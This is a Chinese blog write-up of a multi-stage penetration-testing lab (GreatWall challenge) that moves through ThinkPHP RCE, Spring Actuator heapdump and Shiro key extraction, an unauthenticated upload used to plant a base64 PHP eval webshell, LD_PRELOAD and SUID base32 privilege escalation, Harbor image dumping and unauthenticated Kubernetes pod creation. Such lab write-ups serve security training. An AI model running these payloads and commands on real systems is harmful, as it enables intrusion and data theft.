
+++
date = '2025-05-20T22:00:00+08:00'
title = '春秋云镜-长城杯2024-Writeup'
categories = ["Writeup"]
tags = ["writeup", "渗透", "春秋云镜"]

+++


> 参考文章
>
> [春秋云境-GreatWall(长城杯半决赛) – fushulingのblog](https://fushuling.com/index.php/2024/05/28/春秋云境-greatwall长城杯半决赛/)
>
> [春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n's blog](https://www.dr0n.top/posts/f249db01/#k8s-172-22-14-37)
>
> [春秋云境-GreatWall-先知社区](https://xz.aliyun.com/news/14423)

### Thinkphp5.2.3

先扫一下端口，扫出来8080端口有个后台服务

![image-20250516123814347](../assets/image-20250516123814347.png)

访问8080端口

![image-20250516123833250](../assets/image-20250516123833250.png)

发现这玩意根本不会发起登录请求，就是个前端壳子

dirsearch扫一下，看到有个404

```cmd
PS C:\Users\Xrntkk> dirsearch -u http://8.130.147.101:8080/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: C:\Users\Xrntkk\reports\http_8.130.147.101_8080\__25-05-16_12-34-50.txt

Target: http://8.130.147.101:8080/

[12:34:50] Starting:
[12:34:53] 403 -  280B  - /.ht_wsr.txt
[12:34:53] 403 -  280B  - /.htaccess.bak1
[12:34:53] 403 -  280B  - /.htaccess.orig
[12:34:53] 403 -  280B  - /.htaccess.sample
[12:34:53] 403 -  280B  - /.htaccess.save
[12:34:53] 403 -  280B  - /.htaccess_extra
[12:34:53] 403 -  280B  - /.htaccess_orig
[12:34:53] 403 -  280B  - /.htaccess_sc
[12:34:53] 403 -  280B  - /.htaccessOLD
[12:34:53] 403 -  280B  - /.htaccessOLD2
[12:34:53] 403 -  280B  - /.htaccessBAK
[12:34:53] 403 -  280B  - /.htm
[12:34:53] 403 -  280B  - /.html
[12:34:53] 403 -  280B  - /.htpasswds
[12:34:53] 403 -  280B  - /.htpasswd_test
[12:34:53] 403 -  280B  - /.httr-oauth
[12:34:54] 403 -  280B  - /.php
[12:35:12] 404 -    7KB - /index.php/login/
[12:35:21] 200 -   24B  - /robots.txt
[12:35:22] 403 -  280B  - /server-status/
[12:35:22] 403 -  280B  - /server-status
[12:35:24] 301 -  322B  - /static  ->  http://8.130.147.101:8080/static/

Task Completed
```

访问404的路由即可拿到框架信息

/index.php/login/

![image-20250516124058153](../assets/image-20250516124058153.png)

直接上工具扫

![image-20250516124239086](../assets/image-20250516124239086.png)

可以RCE

![image-20250516124321744](../assets/image-20250516124321744.png)

FLAG1

```
www-data@portal:/tmp$ cat /f1ag01_UdEv.txt 
flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
```



## 第一层

### 智联科技 ERP

信息收集一手

```cmd
www-data@portal:/tmp$ ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:09:56:b7 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
       valid_lft 1892157172sec preferred_lft 1892157172sec
    inet6 fe80::216:3eff:fe09:56b7/64 scope link 
       valid_lft forever preferred_lft forever
```

传个fscan扫一下内网

```cmd
www-data@portal:/tmp$ fscan -h 172.28.23.0/24  
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-05-16 12:56:20] [INFO] 暴力破解线程数: 1
[2025-05-16 12:56:20] [INFO] 开始信息扫描
[2025-05-16 12:56:20] [INFO] CIDR范围: 172.28.23.0-172.28.23.255
[2025-05-16 12:56:20] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING)
[2025-05-16 12:56:20] [INFO] 解析CIDR 172.28.23.0/24 -> IP范围 172.28.23.0-172.28.23.255
[2025-05-16 12:56:20] [INFO] 最终有效主机数量: 256
[2025-05-16 12:56:20] [INFO] 开始主机扫描
[2025-05-16 12:56:20] [INFO] 正在尝试无监听ICMP探测...
[2025-05-16 12:56:20] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-05-16 12:56:20] [INFO] 切换为PING方式探测...
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
[2025-05-16 12:56:26] [INFO] 存活主机数量: 3
[2025-05-16 12:56:26] [INFO] 有效端口数量: 233
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:22
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:80
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:80
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:22
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:22
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:21
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:8080
[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:8080
[2025-05-16 12:56:26] [SUCCESS] 服务识别 172.28.23.17:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]
[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:22 => [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]
[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.33:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.33:8080 => [http]
[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.17:8080 => [http]
[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.17:80 => [http]
[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.26:80 => [http]
[2025-05-16 12:56:33] [INFO] 存活端口数量: 8
[2025-05-16 12:56:33] [INFO] 开始漏洞扫描
[2025-05-16 12:56:33] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle
[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:""
[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form
[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7
[2025-05-16 12:56:33] [SUCCESS] 匿名登录成功!
[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.17:8080
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.33:8080
  漏洞类型: poc-yaml-spring-actuator-heapdump-file
  漏洞名称: 
  详细信息:
        author:AgeloVito
        links:https://www.cnblogs.com/wyb628/p/8567610.html
[2025-05-16 12:56:35] [SUCCESS] 目标: http://172.28.23.33:8080
  漏洞类型: poc-yaml-springboot-env-unauth
  漏洞名称: spring2
  详细信息:
        links:https://github.com/LandGrey/SpringBootVulExploit

```

扫到另外两台机子

```
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17    存活 (ICMP) //入口机
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
```

其中33扫出来存在spring Actuator未授权访问和env泄露

![image-20250516130937261](../assets/image-20250516130937261.png)

[Springboot Actuator未授权访问漏洞复现-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2070446)

![image-20250516131046898](../assets/image-20250516131046898.png)

/actuator/env

```json
{"activeProfiles":[],"propertySources":[{"name":"server.ports","properties":{"local.server.port":{"value":8080}}},{"name":"servletContextInitParams","properties":{}},{"name":"systemProperties","properties":{"java.runtime.name":{"value":"OpenJDK Runtime Environment"},"java.protocol.handler.pkgs":{"value":"org.springframework.boot.loader"},"sun.boot.library.path":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64"},"java.vm.version":{"value":"25.392-b08"},"java.vm.vendor":{"value":"Private Build"},"java.vendor.url":{"value":"http://java.oracle.com/"},"path.separator":{"value":":"},"java.vm.name":{"value":"OpenJDK 64-Bit Server VM"},"file.encoding.pkg":{"value":"sun.io"},"user.country":{"value":"US"},"sun.java.launcher":{"value":"SUN_STANDARD"},"sun.os.patch.level":{"value":"unknown"},"PID":{"value":"663"},"java.vm.specification.name":{"value":"Java Virtual Machine Specification"},"user.dir":{"value":"/"},"java.runtime.version":{"value":"1.8.0_392-8u392-ga-1~20.04-b08"},"java.awt.graphicsenv":{"value":"sun.awt.X11GraphicsEnvironment"},"java.endorsed.dirs":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed"},"os.arch":{"value":"amd64"},"CONSOLE_LOG_CHARSET":{"value":"UTF-8"},"java.io.tmpdir":{"value":"/tmp"},"line.separator":{"value":"\n"},"java.vm.specification.vendor":{"value":"Oracle Corporation"},"os.name":{"value":"Linux"},"FILE_LOG_CHARSET":{"value":"UTF-8"},"sun.jnu.encoding":{"value":"UTF-8"},"spring.beaninfo.ignore":{"value":"true"},"java.library.path":{"value":"/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib"},"java.specification.name":{"value":"Java Platform API Specification"},"java.class.version":{"value":"52.0"},"sun.management.compiler":{"value":"HotSpot 64-Bit Tiered Compilers"},"os.version":{"value":"5.4.0-169-generic"},"user.home":{"value":"/home/ops01"},"catalina.useNaming":{"value":"false"},"user.timezone":{"value":"Asia/Shanghai"},"java.awt.printerjob":{"value":"sun.print.PSPrinterJob"},"file.encoding":{"value":"UTF-8"},"java.specification.version":{"value":"1.8"},"catalina.home":{"value":"/tmp/tomcat.8080.6309224585124471589"},"java.class.path":{"value":"/opt/erp/ERPApplication-0.0.1-SNAPSHOT.jar"},"user.name":{"value":"ops01"},"java.vm.specification.version":{"value":"1.8"},"sun.java.command":{"value":"******"},"java.home":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre"},"sun.arch.data.model":{"value":"64"},"user.language":{"value":"en"},"java.specification.vendor":{"value":"Oracle Corporation"},"awt.toolkit":{"value":"sun.awt.X11.XToolkit"},"java.vm.info":{"value":"mixed mode"},"java.version":{"value":"1.8.0_392"},"java.ext.dirs":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext"},"sun.boot.class.path":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes"},"java.awt.headless":{"value":"true"},"java.vendor":{"value":"Private Build"},"catalina.base":{"value":"/tmp/tomcat.8080.6309224585124471589"},"java.specification.maintenance.version":{"value":"5"},"file.separator":{"value":"/"},"java.vendor.url.bug":{"value":"http://bugreport.sun.com/bugreport/"},"sun.io.unicode.encoding":{"value":"UnicodeLittle"},"sun.cpu.endian":{"value":"little"},"sun.cpu.isalist":{"value":""}}},{"name":"systemEnvironment","properties":{"PATH":{"value":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","origin":"System Environment Property \"PATH\""},"INVOCATION_ID":{"value":"18b641dc6657423cbdeab6262fd1ee07","origin":"System Environment Property \"INVOCATION_ID\""},"JOURNAL_STREAM":{"value":"9:19204","origin":"System Environment Property \"JOURNAL_STREAM\""},"LOGNAME":{"value":"ops01","origin":"System Environment Property \"LOGNAME\""},"USER":{"value":"ops01","origin":"System Environment Property \"USER\""},"PWD":{"value":"/","origin":"System Environment Property \"PWD\""},"LANG":{"value":"en_US.UTF-8","origin":"System Environment Property \"LANG\""},"SHLVL":{"value":"0","origin":"System Environment Property \"SHLVL\""},"HOME":{"value":"/home/ops01","origin":"System Environment Property \"HOME\""},"_":{"value":"/usr/bin/java","origin":"System Environment Property \"_\""}}},{"name":"Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'","properties":{"server.port":{"value":"8080","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 1:13"},"management.endpoints.jmx.exposure.include":{"value":"*","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 3:43"},"management.endpoints.web.exposure.include":{"value":"*","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 4:43"},"management.endpoint.health.show-details":{"value":"always","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 5:41"},"spring.thymeleaf.cache":{"value":"true","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 8:24"},"spring.thymeleaf.check-template":{"value":"true","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 9:33"},"spring.thymeleaf.check-template-location":{"value":"true","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 10:42"},"spring.thymeleaf.content-type":{"value":"text/html","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 11:31"},"spring.thymeleaf.enabled":{"value":"true","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 12:26"},"spring.thymeleaf.encoding":{"value":"UTF-8","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 13:27"},"spring.thymeleaf.excluded-view-names":{"value":"","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:0"},"spring.thymeleaf.mode":{"value":"HTML5","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:23"},"spring.thymeleaf.prefix":{"value":"classpath:/templates/","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 16:25"},"spring.thymeleaf.suffix":{"value":".html","origin":"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 17:25"}}}]}
```

用[whwlsfb/JDumpSpider: HeapDump敏感信息提取工具](https://github.com/whwlsfb/JDumpSpider)自动提取heapdump敏感信息

![image-20250516133111669](../assets/image-20250516133111669.png)

可以拿到shiro key

```
===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES

===========================================
```

![image-20250516133356045](../assets/image-20250516133356045.png)

shiro反序列化打CB链，成功RCE

没有找到flag，说明要提权

/home/ops01里面有一个HashNote，且监听了59696端口，说明要打pwn来提权

不会打pwn，这里直接拿别人的exp梭哈了

**FLAG2**

```
$ cat /root/flag_RaYz1/f1ag03.txt
flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
```



### 新翔OA管理系统

前面fscan扫到172.28.23.26有个ftp服务

```
[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
```

匿名用户可以直接登录

![image-20250522112350742](../assets/image-20250522112350742.png)

可以拿到oa的源码，扒下来审计

可以看到这个

uploadbase64.php

```php
<?php
/**
 * Description: PhpStorm.
 * Author: yoby
 * DateTime: 2018/12/4 18:01
 * Email:logove@qq.com
 * Copyright Yoby版权所有
 */
$img = $_POST['imgbase64'];
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
    $type = ".".$result[2];
    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
}
$img =  base64_decode(str_replace($result[1], '', $img));
@file_put_contents($path, $img);
exit('{"src":"'.$path.'"}');
```

理解一下这个正则

> 1. **`^`**
>    匹配字符串的开始位置，确保从数据的起始处开始匹配
> 2. **`data:`**
>    直接匹配字面字符串 "data:"，这是 Data URL 格式的固定前缀
> 3. **`\s\*`**
>    匹配零个或多个空白字符（包括空格、制表符等），用于处理可能存在的空格
> 4. **`image/`**
>    直接匹配字面字符串 "image/"，表明这是一个图片类型的数据
> 5. **`(\w+)`**
>    - `\w` 匹配任何单词字符（等价于 `[a-zA-Z0-9_]`）
>    - `+` 表示前面的元素必须出现一次或多次
>    - 括号 `()` 用于捕获匹配的内容，这部分会被提取为图片类型（如 jpg、png）
> 6. **`;base64,`**
>    直接匹配字面字符串 ";base64,"，这是 Base64 编码的 Data URL 的固定后缀

我们可以发现$result[1]和$result[2]是可控的

也就是说我们可以写入任意文件，格式如下

```
data:image/文件后缀;base64,文件内容的base64编码
```

这里没有鉴权，直接写马

payload

```
imgbase64=data:image/php;base64, PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4=
```

上马子之后发现有很多**disable_functions**，没办法RCE

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
```

我们可以利用环境变量 LD_PRELOAD 劫持系统函数，从而绕过

蚁剑中有插件

![image-20250522120131429](../assets/image-20250522120131429.png)

修改一下.antproxy.php中的url路径

![image-20250522120923285](../assets/image-20250522120923285.png)

不知道这里一句话木马为什么不能用POST传参，用GET就可以正常RCEl

![image-20250522155422629](../assets/image-20250522155422629.png)

发现没办法直接读flag，需要提权

尝试suid提权

```shell
/bin/fusermount
/bin/ping6
/bin/mount
/bin/su
/bin/ping
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/staprun
/usr/bin/base32
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/s-nail/s-nail-privsep
```

用base32实现提权

![image-20250522155605726](../assets/image-20250522155605726.png)

![image-20250522160019399](../assets/image-20250522160019399.png)

payload

```
?1=system("base32 /flag02.txt|base32 --decode");
```

**FLAG3**

```
flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
```

## 第二层

### 分支一 [172.22.14.0/24]

传个fscan进行信息收集

![image-20250522162347925](../assets/image-20250522162347925.png)

ip addr

```
www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ip addr show
ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:7a:cf brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe03:7acf/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:7a:62 brd ff:ff:ff:ff:ff:ff
    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe03:7a62/64 scope link 
       valid_lft forever preferred_lft forever
```

fscan

```shell
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-05-22 18:49:34] [INFO] 暴力破解线程数: 1
[2025-05-22 18:49:34] [INFO] 开始信息扫描
[2025-05-22 18:49:34] [INFO] CIDR范围: 172.22.14.0-172.22.14.255
[2025-05-22 18:49:34] [INFO] 生成IP范围: 172.22.14.0.%!d(string=172.22.14.255) - %!s(MISSING).%!d(MISSING)
[2025-05-22 18:49:34] [INFO] 解析CIDR 172.22.14.0/24 -> IP范围 172.22.14.0-172.22.14.255
[2025-05-22 18:49:34] [INFO] 最终有效主机数量: 256
[2025-05-22 18:49:34] [INFO] 开始主机扫描
[2025-05-22 18:49:34] [INFO] 正在尝试无监听ICMP探测...
[2025-05-22 18:49:34] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-05-22 18:49:35] [INFO] 切换为PING方式探测...
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.6     存活 (ICMP)
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.37    存活 (ICMP)
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46    存活 (ICMP)
[2025-05-22 18:49:41] [INFO] 存活主机数量: 3
[2025-05-22 18:49:41] [INFO] 有效端口数量: 65535
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:21
[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.6:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:22
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:22
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.46:22
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.46:80
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:80
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:2380
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:2379
[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.6:22 => [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]
[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.37:22 => [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]
[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.46:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.11 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11.]
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:6443
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10252
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10256
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10251
[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:10250
[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:2380 => 
[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.46:80 => [http] 产品:nginx
[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:2379 => 
[2025-05-22 18:49:46] [SUCCESS] 服务识别 172.22.14.37:10252 => [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]
[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.37:10256 => [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]
[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.37:10251 => [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]
[2025-05-22 18:49:47] [SUCCESS] 服务识别 172.22.14.6:80 => [http]
[2025-05-22 18:49:52] [SUCCESS] 服务识别 172.22.14.37:10250 => 
[2025-05-22 18:50:36] [SUCCESS] 服务识别 172.22.14.37:6443 => 
[2025-05-22 18:50:36] [INFO] 存活端口数量: 13
[2025-05-22 18:50:37] [INFO] 开始漏洞扫描
[2025-05-22 18:50:37] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle
[2025-05-22 18:50:37] [SUCCESS] 网站标题 http://172.22.14.46       状态码:200 长度:785    标题:Harbor
[2025-05-22 18:50:37] [SUCCESS] 发现指纹 目标: http://172.22.14.46       指纹: [Harbor]
[2025-05-22 18:50:37] [SUCCESS] 网站标题 http://172.22.14.6        状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
[2025-05-22 18:50:37] [SUCCESS] 网站标题 https://172.22.14.37:10250 状态码:404 长度:19     标题:无标题
[2025-05-22 18:50:37] [SUCCESS] 匿名登录成功!
[2025-05-22 18:50:38] [SUCCESS] 检测到漏洞 http://172.22.14.46:80/swagger.json poc-yaml-swagger-ui-unauth 参数:[{path swagger.json}]
[2025-05-22 18:56:59] [SUCCESS] 扫描已完成: 12/12
```

扫出除了172.22.14.6以外的另外两台机子

```
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.37    存活 (ICMP)
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46    存活 (ICMP)
```

#### Harbor

可以看到172.22.14.46上存在Swagger未授权访问，但是没什么用

![image-20250522173242235](../assets/image-20250522173242235.png)

Harbor的版本为 v2.10

![image-20250522173335511](../assets/image-20250522173335511.png)

尝试打Harbor未授权

[404tk/CVE-2022-46463: harbor unauthorized detection](https://github.com/404tk/CVE-2022-46463)

![image-20250522173828907](../assets/image-20250522173828907.png)

看到有个叫做harbor/secret的镜像，我们把它dump下来

```
python harbor.py http://172.22.14.46/ --dump harbor/secret --v2
```

![image-20250522180342278](../assets/image-20250522180342278.png)

dump下来之后可以找到flag

```
flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
```



#### K8S

通过fscan的端口扫描，我们可以发现6443端口存在K8s API server未授权

![image-20250522190528918](../assets/image-20250522190528918.png)

[浅析K8S各种未授权攻击方法 - 火线 Zone-安全攻防社区](https://zone.huoxian.cn/d/1153-k8s)

[春秋云境-GreatWall-先知社区](https://xz.aliyun.com/news/14423)

用 nginx:1.8 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录

创建pod

```
.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil-deployment.yaml
```

列出pod

```
.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default
```

进入容器

```
.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment /bin/bash
```

![image-20250522191728023](../assets/image-20250522191728023.png)
